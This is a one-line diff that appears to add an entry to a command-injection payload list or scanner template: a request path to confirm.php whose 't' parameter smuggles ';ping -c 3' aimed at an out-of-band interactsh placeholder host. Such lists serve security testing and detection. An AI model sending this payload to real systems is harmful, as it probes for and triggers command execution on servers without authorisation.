@@ -1,0 +1,1 @@
+/notice/confirm.php?t=%3bping+-c+3+{{interactsh-url}}
